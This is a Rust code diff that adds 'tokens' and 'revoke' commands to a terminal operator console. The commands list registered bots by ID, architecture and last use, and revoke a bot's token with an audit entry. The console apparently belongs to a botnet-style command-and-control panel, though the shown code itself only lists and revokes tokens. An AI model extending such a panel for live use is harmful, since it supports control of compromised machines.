@@ -516,3 +516,56 @@ pub async fn handle_config_command(client: &Arc<Client>, state: &Arc<AppState>, 
     
     Ok(())
 }
+
+pub async fn handle_tokens_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
+    let tokens = state.bot_manager.list_tokens().await;
+    
+    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
+    client.write(b"\x1b[38;5;51m=== Registered Bot Tokens ===\x1b[0m\n\r").await?;
+    client.write(format!("{:<38} | {:<10} | {:<20} | {:<20}\n\r", "Bot ID", "Arch", "Created", "Last Used").as_bytes()).await?;
+    client.write(b"---------------------------------------+------------+----------------------+----------------------\n\r").await?;
+    
+    for token in tokens {
+        let last_used = token.last_used.map(|t| t.format("%Y-%m-%d %H:%M:%S").to_string()).unwrap_or_else(|| "Never".to_string());
+        client.write(format!("{:<38} | {:<10} | {:<20} | {:<20}\n\r", 
+            token.bot_id, 
+            token.arch, 
+            token.created_at.format("%Y-%m-%d %H:%M:%S"), 
+            last_used
+        ).as_bytes()).await?;
+    }
+    
+    Ok(())
+}
+
+pub async fn handle_revoke_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
+    let bot_id_str = match parts.get(1) {
+        Some(id) => id,
+        None => {
+            client.write(b"\x1b[38;5;196m[X] Usage: revoke <bot_id>\n\r").await?;
+            return Ok(());
+        }
+    };
+    
+    let bot_id = match uuid::Uuid::parse_str(bot_id_str) {
+        Ok(id) => id,
+        Err(_) => {
+            client.write(b"\x1b[38;5;196m[X] Invalid Bot ID format\n\r").await?;
+            return Ok(());
+        }
+    };
+    
+    match state.bot_manager.revoke_token(bot_id).await {
+        Ok(_) => {
+            client.write(format!("\x1b[38;5;82m[✓] Token revoked for bot {}\n\r", bot_id).as_bytes()).await?;
+            let audit_event = AuditLog::new(client.user.username.clone(), "REVOKE_TOKEN".to_string(), "SUCCESS".to_string())
+                .with_target(bot_id.to_string());
+            let _ = log_audit_event(audit_event, &state.audit_file).await;
+        }
+        Err(e) => {
+            client.write(format!("\x1b[38;5;196m[X] Failed to revoke token: {}\n\r", e).as_bytes()).await?;
+        }
+    }
+    
+    Ok(())
+}
